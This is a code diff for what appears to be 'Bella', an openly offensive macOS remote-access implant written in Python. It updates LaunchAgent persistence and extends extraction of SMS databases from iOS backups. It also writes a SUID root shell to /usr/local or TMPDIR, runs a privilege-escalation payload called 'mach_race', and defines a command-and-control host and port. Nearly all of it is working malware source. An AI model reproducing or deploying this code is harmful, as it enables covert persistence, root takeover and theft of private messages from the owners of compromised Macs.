@@ -60,8 +60,8 @@ def create_bella_helpers(launch_agent_name, bella_folder, home_path):
 	os.chmod('%s/Library/%s/Bella' % (home_path, bella_folder), 0777)
 	print 'Loading Launch Agent'
 	out = subprocess.Popen('launchctl load -w %s/Library/LaunchAgents/%s.plist' % (home_path, launch_agent_name), shell=True, stderr=subprocess.PIPE).stderr.read()
-	if out == '':
-		time.sleep(1)
+	def start_agent():
+		time.sleep(1.5)
 		ctl_list = subprocess.Popen('launchctl list'.split(), stdout=subprocess.PIPE)
 		ctl = ctl_list.stdout.read()
 		completed = False
@@ -75,8 +75,14 @@ def create_bella_helpers(launch_agent_name, bella_folder, home_path):
 		else:
 			pass
 			print 'Error loading LaunchAgent.'
+	
+	if out == '':
+		start_agent()
 	elif 'service already loaded' in out:
-		print 'Bella is already loaded in LaunchCTL.'
+		subprocess.Popen('launchctl remove %s' % launch_agent_name, shell=True)
+		print 'Bella was already loaded in LaunchCTL. Reloading it..'
+		out = subprocess.Popen('launchctl load -w %s/Library/LaunchAgents/%s.plist' % (home_path, launch_agent_name), shell=True, stderr=subprocess.PIPE).stderr.read()
+		start_agent()
 		exit()
 	else:
 		print out
@@ -382,7 +388,7 @@ def remove_SUID_shell():
 		except Exception as e:
 			pass
 			send_msg(e.msg, False)
-			send_msg('%sError removing temporary root shell @ /usr/local/roots. You should delete this manually.\n' % red_minus , False)
+			send_msg('%sError removing temporary root shell @ %s. You should delete this manually.\n' % (red_minus, ROOT_SHELL_PATH) , False)
 	return
 
 def do_root(command):
@@ -1015,10 +1021,13 @@ def iTunes_backup_looker():
 
 def iTunes_bk_sms_extract():
 	info = iTunes_backup_looker()
-	if not info[1]:
-		send_msg(info[0], True)
-		return
 	backup_paths = globber("/Users/*/Library/Application Support/MobileSync/Backup/*/3d0d7e5fb2ce288813306e4d4636395e047a3d28")
+	#the above globber is for < iOS 10
+	backup_paths += globber("/Users/*/Library/Application Support/MobileSync/Backup/*/3d/3d0d7e5fb2ce288813306e4d4636395e047a3d28")
+	#the above globber is for >= iOS 10
+	if len(backup_paths) < 1:
+		send_msg("%sNo SMS backup files found!\n%sAre there iOS backups? Try running 'check_backups'.\n" % (red_minus, yellow_star), False)
+		return
 	send_msg("%sFound the following SMS files:\n\t%s\n" % (blue_star, '\n\t'.join([x.split('/')[-2] for x in backup_paths])), False)
 	send_msg("%sProcessing...\n" % blue_star, False)
 	extracted = []
@@ -1520,13 +1529,15 @@ def make_SUID_root_binary(password, LPEpath):
 			content.write(root_shell.decode('base64'))
 		ROOT_SHELL_PATH = '/usr/local/roots'
 	except IOError as e:
-		if e.errno == 13:
-			#for whatever reason we can write to /usr/local (domain environments typically)
+		if e.errno == 13 or e.errno == 2:
+			#13 if for whatever reason we cant write to /usr/local (domain environments typically)
+			#2 if /usr/local does not exist
 			with open(os.environ['TMPDIR'] + 'roots', "w") as content:
 				content.write(root_shell.decode('base64'))
 			ROOT_SHELL_PATH = os.environ['TMPDIR'] + 'roots'
 		else:
 			raise e
+
 	if not LPEpath: #use password
 		(username, password) = password.split(':')
 		try:
@@ -1672,7 +1683,6 @@ def rooter(): #ROOTER MUST BE CALLED INDEPENDENTLY -- Equivalent to getsystem
 			payload = readDB('mach_race', True).split('     ')[0]
 			#send_msg('Mach race <10.11.5\n', False)
 		root_escalate = payload_generator(payload)
-		send_msg('Created root escalate payload at [%s]\n' % root_escalate, False)
 		os.chmod(root_escalate, 0777)
 		binarymake = make_SUID_root_binary(None, root_escalate)
 		if binarymake[0]:
@@ -2479,7 +2489,7 @@ payload_list = []
 temp_file_list = []
 host = '127.0.0.1' #Command and Control IP (listener will run on)
 port = 4545 #What port Bella will operate over
-bella_version = '1.22'
+bella_version = '1.30'
 
 #### End global variables ####
 if __name__ == '__main__':
